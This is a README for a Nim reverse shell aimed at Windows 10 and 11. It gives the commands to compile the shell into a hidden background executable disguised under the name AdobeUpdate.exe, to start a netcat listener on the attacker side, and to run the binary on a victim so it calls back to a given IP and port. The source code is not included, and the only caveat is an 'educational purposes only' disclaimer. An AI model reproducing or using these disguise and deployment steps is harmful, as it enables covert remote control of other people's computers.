# Nim Reverse Shell

A simple reverse shell written in Nim (see the "Tested Operating Systems" section below for more details). **This code is made for educational purposes only**.


## Tested Operating Systems

- Windows 10 (10.0.19045) 
- Windows 11 (10.0.22621)


### Installation

```bash
sudo apt install mingw-w64
sudo apt install nim
```

The code can be compiled in various ways using Nim. In this example, the code is compiled to EXE using MinGW and runs in the victim's background once executed (thanks to the "--app:gui" flag). Update IP and port

```bash
nim c -d:mingw --app:gui --opt:speed -o:AdobeUpdate.exe rev-shell.nim
```
#### Parameters
*  -d: define compiler
*  --app: generate gui app
*  --opt: optimize for speed
*  -o: output
### Execution
Cybersecurity professional
```bash
nc -lvnp 1337
```
Target System
```bash
AdobeUpdate.exe 10.10.5.25 1337              --defaults to static IP in code if no arguments given
```



